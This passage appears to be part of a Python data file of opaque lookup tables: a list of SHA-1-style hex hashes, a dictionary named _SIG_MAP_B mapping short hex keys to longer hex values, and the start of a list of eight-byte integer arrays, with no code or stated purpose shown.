    "a32e9b6402dd65d55f78245b511d85e44f206963",
    "134b3bb247a627107b81c7f7cc03d3d8ea586797",
    "e05f86932f12dcbd3b6b5237ef7c133c6b977dfe",
    "f10b0e434550b2cc8cb0e94dfa5deacd4e6273c1",
    "0df906851d91bdea6b497aa2bc763314c41b70fc",
    "e46beabe57d1243d59f5d0b369e1a11241a089d0",
    "465281cc844325f132cd6ca7a3e7f49c359d9a3e",
    "33523161647940cabf9a4932948f1e0b7bc167ba",
    "dd423503c0ec00a0ef99f5f72232309aa7de2333",
    "c3348dc2eccdd192d7e40999fc7fe65ec92d4f9e",
    "3370154f14ea7c431e22d4a11e5226814a827540",
    "1f4317d35decb299ff8a8bef4faf3a13ce9b8d20",
    "9c72fc5b32a96e8e65efe082b322a00e650af6a0",
    "3a975bf63ba1b59135a7251e008ce635cf46633d",
    "198351dd2ad1b09a4194a052ea4420c9f7ac3301",
    "25a73aca240390b47df906055dc9ee6ff80625a0",
    "edb6ac0aef8f0fbef1b074c5cc4229dcf35f32d2",
    "1d8bd6f17d870dc673d52d08f320720a00cc64e0",
    "53736ce58227cc86a6fe11fd554ff11a8db67516",
    "ff1fb796030fe55ee6c0dd22d93cf29871b31200",
    "d55baa8df7873d19457a1d8c6eb8b9f7c14664b9",
    "710eba2da2a14458e0e43de4ae1e744026ba8f2e",
    "1a63bc9b0558d463376eada635040a3170eb7f07",
    "dad34d8314ea4a63427b4817f545ce601804a23a",
    "b3d01e471197c0072a9522ad7e8698a6f91a19e9",
    "53e2b3fc90019e970efb0e72e815c2d7f3d2b226",
    "10a42358718f91f85df95eeea7d6f9d137acc940",
    "95333c5f1edf0b82524794499957cc3a68dccf68",
    "287d1119abebacb7c1a1317728117de753252bfe",
    "846afd2406dcb5db2047ce6dfcbaf9237e22f9b8",
    "eca2e7fc7b738903eb17a8b9c1b820160bcea456",
    "758046df073c446a30eb8a3dd868f35e54d257d5",
    "1238cd3a9f0352b7255734fb527f1414761f010b",
    "70124c849cd594e6f1d927dc6eecb5d47626de40",
    "8d37c77cd9e93f9260747a0847ac1087fd78714c",
    "0bcc0480bfa6c1a3c6b400865662d1d79eb117c0",
    "fa3ce176b59057475bcc98b42b16151f3c0b904a",
    "a2755b32a64430ad9d03e4ebf8a1b50ce11bd252",
    "287fb90285188914073578c2ed8c4978be9a75a8",
    "eb5ab551ead0a0f3b543bf997fadbe3ced84b982",
    "7f01b2189d18958f07cf5aeb274e7bbc564c3fc3",
    "f78ab964e7a7bfcaea3ea8468c05c2e4febba9b6",
    "8e311c81d27a1549e7f615d7b103f25931cfb355",
    "f04445cd52f5d3cb819cdc9e4131f8a2328d1343",
    "19fefd2865761876781a6276df6aa38942c923f6",
    "81b00c9cb4ed9c7600fbba6c7ed72abdff6d3076",
    "c6dadd3712a85a089aa69a2e07210808f664da04",
    "2ca9665aa3abf805d74318fab43d974a71234227",
    "5cb9c818d5b480264555f35e8d1e3f09bb299133",
    "d6bf59d0d04dee123a2bd1dfca853af9ffaf9561",
    "ef912a76b336f37fe823de3a2cfc10312babd2d7",
    "7226908feaab31f30ef4fd66d61d9687e87c07c2",
    "c36ff17554063f8edb9816369d5fcf5c8fa33024",
    "42bc7de9e66a183d7292f25760fc13c0d8d82384",
    "b33bdbfde2de8300327bb833061d47f87b8d6435",
    "c12399381e0a72b0c1c0919b71fe4f199b8983d0",
    "20a7a582b9797aa2516e02996b2e9622ababcdcc",
    "1c3a8ee2eb9c957b1127f4db33c519fb496ef16f",
    "76a920f477903e6d6d1f49be2dd168c9628aa66c",
    "ef6ee9ef80b2bfad4d004c1f932b42b357ac0bc1",
    "632f0ed854a04c1363c4e26153200f661ca54183",
    "94bcb57fd7be99eed04712ae18b406ff7e5f1273",
    "1445f3c5320036b31d727026d70d2667fa2d309f",
    "bf2cc476066e09a017ed3dadbffa297d6ffa8e4f",
    "b18a6b232b2cdbb69b5f83503adc0fdc92b3143b",
    "23b30dc6b0d98735fd2378f1488f180389a1211c",
    "d36511316fb895a5168496a56bf169734db117bd",
    "ecc80c1b6236df60c873b96b1ebd0f0cc3e522a8",
    "5d2df484167b796180f41df99bd75c81dea80a41",
    "04de9377a23dc147fe905624fcfae94a3d6bf45e",
    "564ec2e6315b3afc15be9f5efed35eb757519f05",
    "c7030cba115fd5688e8ff3db404e01387106dbe7",
    "38f786b283a0ffd640feb57c70a0629c139feb7f",
    "c6c5325c975ad1eef60bab1e89341b4ee70ba05b",
    "3d9cd9622b3a12f1dced6783600fd9419ad70429",
    "f2ae63dbeedecfe01519af3601be4087a16e2767",
    "a792069a2f45a8effd2fff24bbc09963079e07aa",
    "481b8b0ad7fa1d861c34e6ec0d761f0d3f7d489a",
    "18eb5b5460956e8b2f5cd345c71ff81cb136648e",
    "0fc1d29a5abfb9cda1636d876faefb9f3ffe130a",
    "da3f77dd0d69671cabb4202852340a8b8eec7ac7",
    "596936f64a1b4dd5dbadc82ad5676e999ae41442",
    "bd4548e3a20f8d4a6dfbc64f19d6898458db7e42",
    "675a55bc0dc3d07c2243595297c922ad0e756dde",
    "70a35e80fa153628b6636488eb732db55a647731",
    "e1ab5c592d52284de748c95b6bcfb99ce051b70e",
    "798f2d03c3a7b93b310f7dfc7a66ad346096cf3e",
    "46b7418a0d0baf6feaecd70ab8dfa7ae529c3727",
    "1441a8796747c49f5f9f5412837f656a2cb9e739",
    "1539b33133be1588bbb0251709791920c518af50",
    "86421c399ff85433e16569c248b8361a3b1d755c",
    "52a7dba3407a1512db85c19e1bb477d1617c48a7",
    "85dad4885b8d5951e3ce29f302e5bb74e103a5f5",
    "936d39cf57eefe6fbcb787bffdb6f3a966db6dff",
    "f9d311764d5fe894d796fddb8f69f84ba1fda64c",
    "623f5731dc950e57c103b9f0c5cdfdf746a7d81e",
    "867a055066a34b48c379ddfedd09cf68a80d3a16",
    "3cce57945f9fe18371882ceacc1202610472b495",
    "aacb6dbb6cc6953a8139198d2b339f1dba8b2997",
    "57b58faa42d32469a1444354ea28a40df4c6a0de",
    "eea7cb5fe667fc2f71e07b2c5d38776bee6b6ef2",
    "5af1d1f808a838f554083cbda8d55c24474d439f",
    "cbdbce06c48d3fa5f8be0596cd3e506b25c5f751",
    "d6d78b18bdd69870b7ce76960d83975959c80174",
    "0d9851a4971d4ffcfe5316f8c3c4b97cc0e69661",
    "150c2a49e809b6d5b7a3494f72bd2e2a53bb2034",
    "98eeef3c59f93bbb5c2d19407d7fc5140ea34027",
    "2d23e83446c4eef9c3ecc2a6d8448511f8f0e352",
    "20674d11251e9262ab4c6454c516bc38389530d4",
    "b14061bc6ea22a7d1803d065e205a8f22fdbaed8",
    "772ba086fb12362f23157cf472e853977d574e3d",
    "770699b4e6418d679ccfab7615777b6ffbdeec76",
    "240d06328080d26a42df13b76ac350c5d24708da",
    "bb3d724ce28efbc8c79cbb84da502982fdba651a",
    "b3951a76c3cd90552e3dd9b40fa345a150979832",
    "ea616be0434af275d8e56bcf61bc18da9feeadc6",
    "15961e8631646469abafc94a24a558cf2a2d4bf0",
    "39ee212286c187637fa2d996b7e0a8d34b00d0de",
    "637b2727bbfc705cdceef659115aff2e022f1b4c",
    "175128c42b2321cd8d92347680a1f7f182cdda51",
    "93b3086c91630243440a0e0731c7c9bad1b18393",
    "a01a8f4307165e6d42133d1b67addbbc57ca2f76",
    "45163b907c3bb64b645dbb7047131a0695ed5439",
    "011b3807258e9d54dd3719f51992854c3d7fe1bd",
    "33e9bdab1aafeb6588b09350b7536b10183d6694",
    "e1cf64d13cc0ebc8a2a2aeb4e6719e643dde19a6",
    "0f31418acf198046ca90f02fc031987296ac0064",
    "032e8eb4dbac338045ec9a7847fa91c287f7a09b",
    "2eeec309a98c4b080898def4976d0b406b9e57c7",
    "6f19f22fdfb7cc4ddc0017623b43050390401474",
    "91203879b4da5e7e1c6bb5d990d6bbc343ad4c4d",
    "7c779dff9f9d2b192a68d9d650ed29a846f5e60c",
    "60fbad0cf63fc7c49c04330c536d877183b84c6d",
    "68c207b82aa9fd67fd0fe1ee337cc595f31dd279",
    "4c755cba9404ae646556ec8d8cbe6a0d2547a0fb",
    "363051643e76b588ca44f9f4b9ab9474b43eaaa4",
    "6ae7eaa99e2fe00d9bcb5cc5ee0ce93b7f55fd36",
    "7e65a0333abf169efe2f4a695e147cb559f9bdad",
    "798ae0218ce1138d71056c2a037b4691cdb4e7b3",
    "6b60196e563ca32535b3f9531b6795be34f924c3",
    "350f37191f913bfdbde97e310cf35ac22b03c97e",
    "009abdf66017de4da92dd0fd138d8f59ee4f94d8",
    "2b299e20a6ec5451bea06aca77acdd75dfcc4c47",
    "37301d02edbb764a2d940a93af099726a8a93b4d",
    "527887e7ecc06dc3661c3d21850304d970b684d4",
    "ac5f256cef95867c323bade63f7ad2b51f63ba6d",
    "935aaf331838a3d19bbc5a17e8e0123f957950c1",
    "a2e4e252aea82ad37322e4ec03eedd2de13539ca",
    "1e70ed03d2e54e2320cbcc4c684a02877676b3ef",
    "4ecb70106c631434f2fdd13ee9b615a038a219f2",
    "5151d5a5c91b710db0b599421109c4f5db9fc398",
    "7ece894cbec126f48e553df8d1ba8e5b082d9726",
    "707ecf31891c3c30e45c7f2e374254577c432f1e",
    "d26d103a04b137cd92ae7d262614dff060b121af",
    "9f2525e3f250a58dff4e84cedcf4566919cf1917",
    "33627b5e6460f585e116adfd3f16e70ee132d6d6",
    "82ec560730049c55295fbe47ecef2db34d9d6d7b",
    "2f3bf0c4d0feed8c1c4a67db6784ad10b003e90c",
    "3ee65f7e65b8347fd40490551534ddeafaf78938",
    "997c5a90a5ceb5bb5f4045846efc5b84ef133a14",
    "032b1f96a3d2f52e45e3dd4b74ac2acd531ca8d0",
    "531ed3d8645230dcce326e9477151edccfdb4692",
    "d906b45de6377200130b470f7de97950e524b362",
    "609d537262bde8370b67e076e6104522a474fb9a",
    "4634ab3e25ad0fb98de5760262821c9c82fd1a94",
    "70f57ca8dd285ea28657565d3caed52c3a59fd32",
    "22283ab236eff7ebeb80acc020037b0c5170e16c",
    "e6f1a3e0107376aa9c9fb375163d7c9f329160fd",
    "58f523fb0e81409a25a5a8bf92a278d732f90725",
    "ad1808a9656c34e42ef3e749134f74e2ec87826e",
    "af9630ee6b98aeff3b33a57a8adae8c7fd2bde29",
    "aea26f1056bed5e63a1f848bdb8f65ae33902003",
    "27d518d59f83618a943e1c0f51cd5c83ce669f86",
    "b1dc9002a74fccc3c8c82d9fafbed90331038cad",
    "998638a25b167fd9d53da7cbdf8daadcbb8ded1d",
    "924d5f26dd923113cb7b77ec932201108d927380",
    "d1ed3527ac8d0ec963d436239fef01659bd94715",
    "66af64c17bf636b0dbc471b0cd8a41efbe630def",
    "41630eaebe9020da2f5155976eee594a08b30a12",
    "91b89f2aaa5c44e5e18e92e3e6883bfeb7a3d142",
    "02156316de518b0c20786c081386ce24bb7de721",
    "502fa01f89610453693049369b26fe83bee169ff",
    "7c431ec772eba93aa100548a5c7f48a8d59bf67b",
    "57483545ed11c7523fb2f9a99f6c9acd077e18d2",
    "7215ad08b296e761ac8631c82830270bf16c3d24",
    "94a1d580e37016264596829dae3b8919178b8ca8",
    "84f00aec7fe250b05a0e4df17a6447faa381ce51",
    "6a7f14ea0d8dbcb669b4394399f5d1d72d1f3945",
    "a204589f7f35861cd699fafca24600aa6c857d8b",
    "7fcec65fa335f7dcf80281aeb70bcae84debe3cc",
    "ef32996371d0192dbc4672c90ba0016f7fd6f9cc",
    "e82dbfd0aa2a0fd044adcdcf2e45ea9a4c696884",
    "85fedb576271b80752a35a748ed7a2c6d872382c",
    "bcce078d7b660a331546310244e77ebb1441ddbc",
    "02aa32801d5067325d73dda799202ff961d007a5",
    "e2a8fab9629813da3a94fa9dec2531a8ae722531",
    "4e10d6f4435aa57ac588c1548bf36cafb06ed7d7",
    "05be6aeb83d86748a7bd0bb04ae6eee6f98cc721",
    "73ce07a01e2a3b7841d1c8038bea27573c4d47c6",
    "07bb9e616a08ca569e325113fe595f7c17441766",
    "d836b7d2413fd2df1d29cccb48ec1c89d0031b8b",
    "2a03231f69a318d80fb0bf721d83c97832d78e48",
    "06bb06aa8bc498b4f2dd98fc5488a6c66f5aa769",
    "05244a7193e06054271f08dd48a3608b52b740b6",
    "bbc9eec9d08792abda59fc19f8f7ef649707a7b0",
    "3778b8a4e6fdee3c87021a6bdf047b8d3dbd00fe",
    "1b16eec905e2f75f267d1a7b032099363f36d0fe",
    "ba80c5a19d14b3357cfeeaaa7b6e997348b32efb",
    "74dd45cedd7ec87c9da2951f97b1593baaa4ef37",
    "1670d142c198810b7336c3ed8bcbb647fc73c3aa",
    "1946ca3f67a6c79128e18b0131130c42548832a1",
    "af370c99177fe8c9e3983e81f650422d7f542cae",
    "27c7885fc88ce5c1b2bae74703d21c1bd4a2f340",
    "8300f3760147ce7e6d00d4cdfbb927c4f4930728",
    "03e132763b4f1681174e97bda117d469d32a5039",
    "2762d09d21c7c5a8d39de3d45ba1ee03ebfc5ba0",
    "3bde7a2923b8863dd42ab1fc3ec6c78f26279adc",
    "0d14472df3a79ee5b9f5c01a49639a8efbd34f9d",
    "0d065bd6f3fb4417768123acaaa464ae675068af",
    "18e1b5678e58be9aec9570e7b335880bf2b3a910",
    "02cbd2bccd9e77f21e393580b162964a0c57470f",
    "ef8dcf48a81f55c6c4e11abdcdb91e69a5240a26",
]

_SIG_MAP_B = {
    "e50818ca50": "b9c92827e7628f75a5391c67",
    "a8283e5893": "d49291c9a6e7657e4c0434a2",
    "cd749d98df": "6efc181cfbf45ff54a53140b",
    "c2bda41bcc": "63067750cbef9519ae7a0079",
    "edf819eb38": "8129b125e9f72f6f1df4d9f3",
    "591cc3185a": "14162f288c8f6da67f59b6f4",
    "044145b7ec": "5055eb0e638e9c77af8dcf90",
    "47d177ca85": "23a6c50cdea8f5141fc322a8",
    "3162ef83b3": "270687948a83f5be46691968",
    "b7010c65f8": "9899ef7c5a681c506b7bc413",
    "4a8ee2ae57": "4cc110f465bf40e38c1511e6",
    "cb3ad60d2d": "a4b90c583d7f52f1c445a028",
    "0928c73df7": "2a9c12c3f4c0fef1137765a1",
    "b453e596a3": "b49f9178a8f43f7d35dee79e",
    "d727e3fd0e": "31000c7589653753138ef7bf",
    "6b8de67106": "d6b2bd272c752a9fbd495281",
    "ed52c394dc": "88771b327ad8649e051a1c73",
    "acaa87a402": "10c19445974c2fd706478a8e",
    "ca3aae352f": "5068f3805e3239dc3f47d57d",
    "9180187131": "37ae1ca2782c82619b8b258c",
    "f0550d7061": "80f4b381d99988429527e3c8",
    "a6f0eb59b7": "d94fe790e2b7089349674634",
    "5f6a68ef93": "eb6cd97962284cdb4a507917",
    "ec93f0c5e0": "bd73b609f0389eb56bf057bf",
    "41d761b0df": "cadcc9c1a4ddf1bbb9718c63",
    "3b0f9895d8": "49dc8ff0870f9d65fb8cbd46",
    "350c53331c": "dc8fcd536e6d8cb98e9e0d67",
    "4fc3e7f981": "b4b5d770767abb259b2e9adf",
    "9f2a72bda9": "5d742cc789675e59475ab9a7",
    "34f06c6b2c": "3a6a70c1e452d9152c2fc570",
    "cc873efd85": "70486b51ddc0c064fc95cff8",
    "da2eb41924": "bc2c80a5d6290bffc187511c",
    "f964a3ec81": "c56a6a1c16688b5abab32c1c",
    "22a366fd87": "e5adeedd0d41a94dc244b33b",
    "b720c8f470": "399000ee0b403e2647673ca5",
    "a780cfaaf3": "ea993c9da6ae743a34cf0d61",
    "0e981fce69": "d574539e4042f3ced76fce4c",
    "ed9d78c767": "7b8634bb601cb355f1098d3a",
    "233a9c516e": "bdf11fedc8dc51d53e5e8fc2",
    "78f7a8b733": "a8e3d1ecf941803086c983f3",
    "7d7335d3c3": "c59ae61db46b0cb0b24380fe",
    "1b88469053": "c936a826761e4b4b867c04bd",
    "1d6f8a4f2d": "22011dabda5265b7d3068c15",
    "c919bec9f9": "5a6b55e9b248e5cbc2170151",
    "ff1de61a0b": "f977241f217d2911c49d6acc",
    "dca19e876f": "b7242ec623ee21376375be96",
    "7e41c212ea": "97ca3992a0abd026e151934f",
    "6c670fb16f": "868ef1ae4b6a87918de4b940",
    "a81e1b28b1": "43d381d99935b7b6fb22694d",
    "c0a54b8b16": "44b0ae6cbd637a4ffa8fdfd1",
    "7291ecb9be": "e431933168af6ea9ac0447dc",
    "6d754e82f2": "874b70dc168d87b2617b821c",
    "38c9ca34ad": "f9f95ff3b0d7fb59526f912d",
    "18693cf374": "22177b6c7b88e7c005d43b9c",
    "794bf4ca2d": "80bfac56503e0986b355c789",
    "3d2878fd11": "3d3e562691945e0a0c4ee0a0",
    "8d6189329e": "7d9bb550a9fe59a8cf53529f",
    "1dbdcbec21": "dd405ab1d97280f732db1fee",
    "f18416dd75": "99d038c48f646003f90faf5f",
    "0473a8bc14": "d13814c85fbc6f8e39292334",
    "703d901382": "bf8ae280e548239e30c7f550",
    "dea23571ff": "1f7c04d3566381e11503fb80",
    "4a5600dd57": "6803c1de0e4ffcde2c4954ba",
    "fc2070fd5a": "31dfa1887a4ef2b5c92a4b44",
    "dba5533866": "a15fe64024902e96e76dbeae",
    "7a7ef86da5": "a7f5da0291444e2870f146f2",
    "04c2f1cee0": "9c5a035f6cab0d1cf9df04d2",
    "d1615dda66": "2bef25e7f5e9d0f61f09639d",
    "8ac4a0d771": "882a133b264c1c0d89a4e5ed",
    "512fb51daf": "0e67ff7bc5740992e3f84300",
    "f538715ba3": "2a2480fcd6ff396dbbf83175",
    "3ff97ed0ac": "b41864cd22cf6888eab5ebe5",
    "7183047a3b": "9b1828bade41251bb956832c",
    "dd86a3a209": "7a39d76b1d924c2e1507e216",
    "337b32f7ae": "e5a5e0c96366dac894ab6388",
    "400fc3ffa5": "15ff3bee211fa8722e4e5a4c",
    "060efc9ca3": "0020edbb2e2f67cc44209034",
    "eb4693f583": "bd9aae22a732ccc3faf1671e",
    "8b32477e34": "ef13c8e1b05697b1af213e22",
    "228f9ceb09": "89714d0c30e76b244c3ace5e",
    "c96919fa51": "537ab242a3869689ed369728",
    "be0cbf1252": "723e2fe20df3b92f71a4bc93",
    "c07cbf7e2d": "5a61a546b8356705c54251c5",
    "0670d3e5f4": "c76b8b5ca3531c558ddd81f1",
    "bdec3b298f": "242b4341d827c70d34ac6308",
    "319541e9f5": "c68f78ed246ba75671dac0e1",
    "a8046b751a": "687e097353535384a4e5c3b1",
    "207d8bbe34": "37a9283687cd625ec5e444ce",
    "87d4d3c678": "4413eefa6f7d89b7d910532c",
    "28d4bc8530": "0818fadbb53ac6ee970ae8e2",
    "ea60586e3a": "d31e4e7769fa4e1cec5666b1",
    "4f5805a051": "ab7a29736d9761ed5a602c86",
    "b4e2bed576": "f870199b01a57e7e1690f47a",
    "1246ca552c": "c7e469a9bc751d5a5f4b65f5",
    "47a81a71a9": "e8158dceec8932b865059500",
    "faeb86567f": "e269520d31aa372ad25ec3b8",
    "6a0bb3212e": "42128e8a4c7866adc6cd9247",
    "c88f8f5e37": "675241ff65054ab8d6832af4",
    "2389bfdbe3": "6e6a9f1d995f68fb72d412e4",
    "7c1d8d3006": "2c122f8f006837fe21bce8ec",
    "f416068813": "c3b02d36a66c457cfc2c02c3",
    "dc54e32092": "c9f27a102383b9705a0b91e9",
    "a41696ac6b": "048d47470a98c262f04ea463",
    "2e216908a3": "7936ed70caf96565bd5346a3",
    "1792647991": "ba969f5fa4d9930604c70e5c",
    "51a809c418": "79437dbb59f1cf29292fbcf1",
    "402897c415": "2961112d830d8c9112c8b84b",
    "607771d24b": "189e7859be08a1557ca9f7ed",
    "755e1d1805": "46fe8c4b026880ae95a9e71c",
    "30baf17734": "1bdb87b452732fa80b7ecf9c",
    "c4d8912e13": "2b32351658d29a08746e754d",
    "8140b395e1": "9e2027202c47361252f4f771",
    "9720a0c37e": "68d674a1644186557f31389a",
    "b8cd659691": "7975cd82eae53e04f6b0fee8",
    "00f9e51e59": "f99bfab131238729e56cb7d3",
    "b3b6f36c91": "ba3825adfd0ba9034b74b5ff",
    "8ee5d6a766": "c689c616a2925b366e2b28ea",
    "ba1b5bffe1": "19288d3b304b5a1f400ea5f0",
    "83421521e5": "e07d85d46f1ff9b8015d6caa",
    "d493d0d9de": "3c01cb5d1161220cf34957cb",
    "6c3d9d79b6": "df8a8b7d7793dab123e67f98",
    "4c9f9d47ab": "b9ac1fdc3f13869565e92233",
    "08675af18f": "c10ae769c57158c171a39aea",
    "701db93e2b": "5fccc36b038e3a1c2f8aea63",
    "f3196bf955": "3f94053530714ee76c3128e9",
    "258cdcf98a": "6d679099e470a1e10b1fd519",
    "ca23e9e3f1": "0291d9ef3b8a384df8aafb9a",
    "d3789363c1": "bfb9ef4669139148a5e82bd9",
    "2c6f7af1a1": "9072941432830e81f139e4cb",
    "3ee0194ca7": "7dd7c8aca8dc2c7a82bba59d",
    "616afc33a1": "a61644c146002494aefa3b99",
    "8df12fe07d": "e449f46cd155e86aba2b9266",
    "bd9e7be537": "cb1c0586d0c6d4535d8b0bc8",
    "51177a08b9": "5aedffc10175eac706c7f72e",
    "53235f655a": "1ea6ac16851be1c15bfc242b",
    "6d104ef607": "9060242c17a627f51722a78f",
    "67684f9390": "3a3459feb081eda6fc558d73",
    "870a0cb425": "a958d8ac167c0714c4ad839e",
    "8d32271efd": "6fecbcfc94146561b532dcfe",
    "5ce2c80848": "397ff0a16dd0c61e8419005a",
    "6ba8b8961d": "d83ec4b04f4232ffca34528a",
    "f9bf54383a": "ccd1f33381102872921b9a8f",
    "230cb108ee": "0f98898efd0e340874f5c1b3",
    "6841cc984b": "e2843385e7db4a3b0aa96731",
    "c982a6b8a9": "16f81cb7e52573c8d7d08d40",
    "de63823fb5": "74295aa2f7d6785eb0e7389f",
    "9a186d1aaf": "969b0038a1362cef17f5f5a0",
    "a3c9b63de9": "00007e7ae6b2f1e85d532cae",
    "f78486f8fa": "bc1dde453638dd2763348d42",
    "d3b99efaf0": "d577f7c1ada74567e4fbb350",
    "1281153725": "191ba64de9fd857ff8b29aad",
    "59d113e273": "6ab1599989562f198013bc5c",
    "e829046a7e": "250329c90f13dd6b260d50dd",
    "be81bf2563": "e48523df1073c8203d32b461",
    "33bceea81e": "289628e577782b9133b2707e",
    "aa05f5c89a": "e945e088e4f87fb9a2404bb8",
    "4b36fe3ab1": "8f826165d9ef9af081223fb8",
    "56433cda9e": "8e6830a0ccc57ad9cd0500db",
    "92b53fef3a": "1983f6a5fa7593ee20e000b8",
    "929671cec6": "d557813722372d42b665c798",
    "5053adac6c": "7f01ca89e56c8d615cdb2bb6",
    "d4999c6d05": "1f8404da7913092455b02152",
    "f3d16c4bf9": "678f1e8f7e683b5e3113a139",
    "69ff402f0d": "baa3a6689590da7a8d6b4104",
    "f4b0207947": "1a16569a67b496f116975f7e",
    "13224cc8a8": "2f306095ef434e6293d00f75",
    "2d15e93972": "e0942efba2a7d12ce6b370fb",
    "dddb803a20": "4977cb471038baf5302a647b",
    "3f831ce71b": "b2602f4730ffd80106e18d61",
    "c18ccb29fd": "313d13daf7c47eb7846025b2",
    "b2c9881c3a": "c0ddc7c7ac0a1464b3289a5d",
    "326269e776": "eef5e0bba9db2e58407f6ce7",
    "eab798ce4d": "fa526e30fb7d0d076b84da7c",
    "195fee5d1f": "53790335cded9ddb90f84129",
    "795c726e38": "54050d943a67a21530215d42",
    "ae3a7d68e7": "960b16f498af8f4678c690ac",
    "ab951ce721": "cb2122ce9849890d64b0de5c",
    "8cd692c492": "b4912821172a4cbd456d73e9",
    "95629962ec": "e8607d25b2bf14d251cb48da",
    "6081e8ac39": "b1ed79c1b5f19c3984b73a2e",
    "70a1470f89": "747b65b46eafbf6b1b7a273b",
    "972193265c": "7f92fdca3661739f2c630215",
    "ad8b5703fb": "8a420a33ae024652627822c4",
    "d6cd3be816": "81087f06a9af6935edca26b1",
    "4bc083fc6d": "79a5b8353ce963fe8f5d44c0",
    "eb84510c79": "11d0c4c7c6f66b8c8aa3d177",
    "40b9bef1c7": "986f6719ed4ed8e14f99fb36",
    "f1b2b13045": "068ecea2e1300c3b35809fe8",
    "3a3d8986ed": "9ab071e9e9b3c1380694100d",
    "9ebff2dbd8": "8d4bd1cc585bb409e4e83aa2",
    "b72a3fbaa4": "9512d3ed33cd92458e894561",
    "0af0e4823b": "0022e6b09d88fa2c7da4dac9",
    "d1e31cf10f": "42b56ccc6b77cfbde196fbb4",
    "819555bed4": "099919097fa52732e680e19e",
    "4510e1d1c3": "c0f593497e8a3026c4fcae2c",
    "28b9ced028": "77a8b6a9776ff58ebc8c34db",
    "f8efffe315": "f7f6d7f2fb623a870dac7196",
    "73845ca40f": "2bc6646fe4be4fafc48a9f2e",
    "d588635dc7": "8b7d31bbbcc2049a6d23250d",
    "716e29382d": "995dcf336cf7dca950fc04cd",
}

_BYTE_DB_B = [
    [213, 217, 237, 116, 60, 154, 145, 21],
    [154, 71, 106, 115, 185, 229, 219, 208],
    [33, 25, 93, 139, 110, 49, 72, 49],
    [163, 147, 240, 18, 38, 49, 225, 65],
    [124, 75, 45, 104, 142, 114, 59, 137],
    [4, 96, 101, 177, 192, 18, 202, 97],
    [105, 155, 87, 83, 222, 66, 3, 152],
    [34, 221, 172, 102, 130, 110, 147, 0],
    [212, 231, 106, 63, 147, 27, 183, 201],
    [128, 111, 154, 145, 156, 177, 114, 234],
    [11, 139, 94, 0, 120, 27, 196, 104],
    [117, 9, 217, 52, 118, 69, 88, 255],
    [30, 28, 215, 9, 195, 190, 219, 205],
    [83, 132, 119, 144, 53, 194, 233, 242],
    [106, 123, 4, 89, 212, 137, 17, 33],
    [68, 64, 253, 78, 35, 17, 181, 254],
    [94, 140, 108, 96, 150, 9, 95, 53],
    [170, 81, 151, 84, 218, 194, 212, 85],
    [165, 94, 83, 202, 16, 105, 240, 176],
    [78, 92, 29, 22, 13, 76, 139, 255],
    [165, 128, 52, 68, 196, 140, 17, 254],
    [15, 205, 28, 218, 152, 158, 44, 177],
    [190, 89, 70, 6, 176, 53, 117, 240],
    [103, 202, 172, 208, 83, 48, 112, 219],
    [8, 123, 72, 112, 67, 125, 4, 37],
    [0, 218, 173, 243, 252, 106, 9, 6],
    [51, 0, 29, 106, 251, 68, 195, 241],
    [146, 224, 245, 16, 171, 77, 120, 0],
    [105, 199, 208, 161, 38, 38, 188, 243],
    [170, 118, 90, 166, 139, 211, 87, 33],
    [214, 173, 169, 221, 0, 26, 90, 90],
    [155, 26, 162, 129, 102, 111, 189, 25],
    [148, 65, 47, 243, 4, 248, 164, 152],
    [162, 84, 244, 55, 113, 255, 238, 20],
    [234, 75, 245, 240, 131, 130, 14, 27],
    [241, 8, 198, 155, 37, 166, 133, 178],
    [142, 211, 77, 71, 13, 130, 228, 58],
    [189, 43, 184, 143, 176, 104, 236, 106],
    [129, 129, 165, 218, 112, 250, 51, 158],
    [80, 22, 72, 203, 127, 116, 178, 17],
    [191, 45, 60, 2, 107, 236, 43, 109],
    [140, 24, 18, 141, 52, 68, 215, 167],
    [4, 238, 90, 188, 8, 105, 118, 232],
    [226, 252, 74, 184, 107, 222, 36, 102],
    [26, 39, 37, 250, 112, 54, 127, 43],
    [79, 81, 121, 47, 249, 38, 6, 120],
    [217, 252, 232, 11, 14, 27, 65, 219],
    [20, 192, 175, 199, 255, 191, 90, 229],
    [103, 93, 24, 147, 241, 133, 245, 68],
    [50, 113, 32, 121, 250, 55, 131, 243],
    [129, 71, 205, 197, 85, 146, 58, 213],
    [163, 130, 40, 210, 107, 164, 91, 159],
    [81, 93, 245, 50, 240, 141, 32, 10],
    [201, 175, 178, 209, 75, 200, 225, 61],
    [195, 169, 179, 17, 144, 52, 158, 183],
    [221, 189, 210, 226, 202, 191, 112, 67],
    [99, 100, 106, 54, 232, 245, 91, 118],
    [6, 23, 19, 4, 18, 96, 3, 189],
    [49, 102, 148, 186, 111, 249, 52, 241],
    [201, 37, 48, 238, 13, 75, 251, 2],
    [32, 5, 191, 16, 162, 138, 231, 13],
    [150, 144, 4, 211, 170, 5, 1, 230],
    [208, 123, 61, 56, 155, 218, 200, 104],
    [39, 43, 131, 107, 36, 214, 200, 151],
    [215, 36, 71, 117, 142, 50, 135, 114],
    [43, 244, 84, 249, 239, 159, 22, 130],
    [86, 170, 79, 121, 65, 254, 237, 209],
    [211, 44, 134, 245, 235, 132, 91, 149],
    [172, 161, 122, 81, 55, 75, 174, 234],
    [213, 43, 89, 35, 123, 170, 237, 3],
    [70, 226, 1, 11, 229, 53, 248, 135],
    [159, 175, 5, 2, 153, 37, 166, 167],
    [95, 124, 112, 118, 183, 248, 109, 1],
    [2, 172, 55, 49, 238, 36, 117, 205],
    [83, 52, 124, 53, 248, 108, 33, 216],
    [68, 28, 197, 34, 180, 6, 86, 90],
    [52, 6, 147, 59, 64, 204, 105, 173],
    [13, 197, 175, 115, 82, 69, 215, 0],
    [118, 210, 28, 229, 54, 66, 10, 255],
    [150, 89, 231, 140, 38, 0, 233, 8],
    [203, 106, 25, 179, 94, 108, 196, 233],
    [97, 153, 94, 140, 145, 190, 2, 81],
    [57, 60, 190, 166, 119, 22, 111, 27],
    [218, 251, 44, 236, 112, 121, 255, 146],
    [254, 191, 236, 175, 254, 37, 116, 153],
    [3, 103, 116, 215, 224, 211, 117, 92],
    [40, 155, 148, 141, 1, 168, 30, 66],
    [77, 69, 212, 183, 113, 233, 171, 209],
    [74, 74, 116, 217, 201, 187, 217, 22],
    [234, 63, 5, 173, 38, 167, 177, 35],
    [93, 1, 31, 81, 152, 163, 92, 141],
    [126, 250, 161, 32, 159, 100, 1, 139],
    [11, 29, 142, 36, 131, 11, 76, 100],
    [240, 32, 101, 155, 30, 130, 37, 13],
    [114, 248, 61, 183, 3, 91, 206, 23],
    [94, 179, 89, 214, 140, 174, 147, 236],
